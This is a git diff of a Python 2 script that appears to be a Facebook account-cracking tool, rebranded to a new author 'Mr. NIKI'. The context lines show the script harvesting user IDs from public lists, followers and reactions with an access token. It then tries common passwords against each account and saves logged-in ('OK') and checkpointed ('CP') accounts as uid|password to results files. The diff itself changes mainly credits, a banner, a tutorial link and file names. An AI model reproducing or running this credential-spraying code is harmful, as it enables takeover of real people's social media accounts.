@@ -1,7 +1,7 @@
 # -*- coding: utf-8
-# coded by angga kurniawan
-# fb.me/gaaaarzxd
-# instagram.com/gaaarzxd
+# coded by Mr. NIKI
+# fb.me/Niki.Cyber404
+# instagram.com/niki.cyber404
 
 try:
 	import requests
@@ -48,8 +48,7 @@ op = bulan[nTemp]
 
 def logo():
 	os.system("clear")
-	print("  \033[0;91m___ ___ __  __ ___ ___ \n \033[0;91m/ __|_ _|  \/  | _ ) __| \033[0;96mAU\033[0;97m : NIKI ID \n\033[0;97m \__ \| || |\/| | _ \ _|  \033[0;91mFB\033[0;97m : [?]\n\033[0;97m |___/___|_|  |_|___/_|   \033[0;93mGH\033[0;97m : GITHUB.COM/Niki-Cyber404")
-
+	print("  \033[0;91m❤️❤️❤️_____❤️❤️❤️❤️❤️❤️❤️_❤️❤️❤️_❤️❤️❤️_______❤️❤️❤️_❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️\033[0;91m ❤️❤️❤️____❤️❤️❤️____❤️❤️❤️____❤️❤️❤️_❤️❤️❤️_____❤️❤️❤️__❤️❤️❤️_______\n \033[0;91m❤️❤️❤️______❤️❤️❤️_______❤️❤️❤️_____❤️❤️❤️_❤️❤️❤️____❤️❤️❤️_______\033[0;91m❤️❤️❤️_______❤️❤️❤️_____❤️❤️❤️______❤️❤️❤️_❤️❤️❤️____❤️❤️❤️_______\033[0;91m❤️❤️❤️❤️❤️❤️❤️❤️❤️___❤️❤️❤️❤️❤️❤️❤️_________❤️❤️❤️❤️❤️_____❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️\033[0;96mAU\033[0;97m : NIKI ID \n\033[0;97m❤️❤️❤️____❤️❤️❤️_____❤️_____❤️❤️❤️_❤️❤️❤️_____❤️❤️❤️__❤️❤️❤️_______\033[0;91mFB\033[0;97m : [?]\n\033[0;97m❤️❤️❤️_____❤️❤️❤️_________❤️❤️❤️___❤️❤️❤️___❤️❤️❤️___❤️❤️❤️❤️❤️❤️❤️❤️__\033[0;93mGH\033[0;97m : GITHUB.COM/Niki-Cyber404")
 def bot_komen():
     try:
         token = open('login.txt', 'r').read()
@@ -113,7 +112,7 @@ def tokenz():
 		menu()
 	except (KeyError,IOError):
 		logo()
-		print("\n \033[0;97m[\033[0;93m*\033[0;97m] How To Get Token : https://youtu.be/RIpCHs7E4qs")
+		print("\n \033[0;97m[\033[0;93m*\033[0;97m] How To Get Token : https://youtu.be/UCsH0yB-x6fKeu8uQ-uDhTzw")
 		token = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] Your Token : \033[0;96m")
 		try:
 			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
@@ -174,19 +173,19 @@ def menu():
 			menu()
 		elif ask == "1" or ask == "01":
 			try:
-				totalok = open("results/OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
+				totalok = open("results/NIKI-OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
 				print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
 				print(" \033[0;97m[\033[0;92m+\033[0;97m] Results \033[0;92mOK\033[0;97m Date : \033[0;92m%s-%s-%s \033[0;97mTotal : %s\033[0;92m"%(ha, op, ta,len(totalok)))
-				os.system("cat results/OK-%s-%s-%s.txt"%(ha, op, ta))
+				os.system("cat results/NIKI-OK-%s-%s-%s.txt"%(ha, op, ta))
 				exit(" \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
 			except (IOError):
 				exit(" \033[0;97m[\033[0;91m!\033[0;97m] No Results Bro")
 		elif ask == "2" or ask == "02":
 			try:
-				totalcp = open("results/CP-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
+				totalcp = open("results/NIKI-CP-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
 				print("\n \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
-				print(" \033[0;97m[\033[0;92m+\033[0;97m] Results \033[0;93mCP\033[0;97m Date : \033[0;92m%s-%s-%s \033[0;97mTotal : %s\033[0;93m"%(ha, op, ta,len(totalcp)))
-				os.system("cat results/CP-%s-%s-%s.txt"%(ha, op, ta))
+				print(" \033[0;97m[\033[0;92m+\033[0;97m] Results \033[0;93mNIKI-CP\033[0;97m Date : \033[0;92m%s-%s-%s \033[0;97mTotal : %s\033[0;93m"%(ha, op, ta,len(totalcp)))
+				os.system("cat results/NIKI-CP-%s-%s-%s.txt"%(ha, op, ta))
 				exit(" \033[0;97m[\033[0;93m#\033[0;97m] --------------------------------------------")
 			except (IOError):
 				exit(" \033[0;97m[\033[0;91m!\033[0;97m] No Results Bro")
@@ -225,14 +224,14 @@ def public():
 	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Want to Use a Manual Password? Y/t : ")
 	if ask == "Y" or ask == "y":
 		manual()
-	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
-	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
+	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mNIKI-OK\033[0;97m Saved In : results/NIKI-OK-%s-%s-%s.txt"% (ha, op, ta))
+	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mNIKI-CP\033[0;97m Saved In : results/NIKI-CP-%s-%s-%s.txt\n"% (ha, op, ta))
 	
 	def main(user):
 		global loop, token
 		pwx = []
 		sys.stdout.write(
-		      '\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
+		      '\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s NIKI-OK-:%s - NIKI-CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
 		); sys.stdout.flush()
 		try:os.mkdir("results")
 		except OSError:pass
@@ -256,7 +255,7 @@ def public():
 				if 'mbasic_logout_button' in xo or 'save-device' in xo:
 					print('\r  \033[0;92m* --> ' +uid+ '|' + pw + '       ')
 					ok.append(uid+'|'+pw)
-					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
+					save = open('results/NIKI-OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
 					save.write('  * --> '+str(uid)+'|'+str(pw)+'\n')
 					save.close()
 					break
@@ -270,7 +269,7 @@ def public():
 						nama = data['name']
 						print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '|' + ttl)
 						cp.append(uid+'|'+pw+'|'+ttl)
-						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
+						save = open('results/NIKI-CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
 						save.write('  * --> '+str(uid)+'|'+str(pw)+'|'+ttl+'\n')
 						save.close()
 						break
@@ -317,14 +316,14 @@ def followers():
 	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Want to Use a Manual Password? Y/t : ")
 	if ask == "Y" or ask == "y":
 		manual()
-	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
-	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
+	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mNIKI-OK\033[0;97m Saved In : results/NIKI-OK-%s-%s-%s.txt"% (ha, op, ta))
+	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mNIKI-CP\033[0;97m Saved In : results/NIKI-CP-%s-%s-%s.txt\n"% (ha, op, ta))
 	
 	def main(user):
 		global loop, token
 		pwx = []
 		sys.stdout.write(
-		      '\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
+		      '\r \033[0;97m[%s*\033[0;97m] Cracking %s/%s NIKI-OK-:%s - NIKI-CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
 		); sys.stdout.flush()
 		try:os.mkdir("results")
 		except OSError:pass
@@ -409,8 +408,8 @@ def reaction():
 	ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Want to Use a Manual Password? Y/t : ")
 	if ask == "Y" or ask == "y":
 		manual()
-	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mOK\033[0;97m Saved In : results/OK-%s-%s-%s.txt"% (ha, op, ta))
-	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mCP\033[0;97m Saved In : results/CP-%s-%s-%s.txt\n"% (ha, op, ta))
+	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;92mNIKI-OK\033[0;97m Saved In : results/NIKI-OK-%s-%s-%s.txt"% (ha, op, ta))
+	print(" \033[0;97m[\033[0;96m+\033[0;97m] Account \033[0;93mNIKI-CP\033[0;97m Saved In : results/NIKI-CP-%s-%s-%s.txt\n"% (ha, op, ta))
 	
 	def main(user):
 		global loop, token
@@ -477,7 +476,7 @@ def reaction():
 	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")
 
 def manual():
-	print(" \033[0;97m[\033[0;93m*\033[0;97m] Example Pass : bismillah,123456,indonesia")
+	print(" \033[0;97m[\033[0;93m*\033[0;97m] Example Pass : 786786,123456,445566")
 	pw = raw_input(" \033[0;97m[\033[0;93m?\033[0;97m] Set Password : ")
 	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Crack With Password : \033[0;91m%s"%(pw))
 	if len(pw) ==0:
@@ -578,3 +577,4 @@ if __name__ == '__main__':
 		exit(" \033[0;97m[\033[0;91m!\033[0;97m] How To Usage : python2 run.py")
 	os.system("git pull")
 	login()
+ 
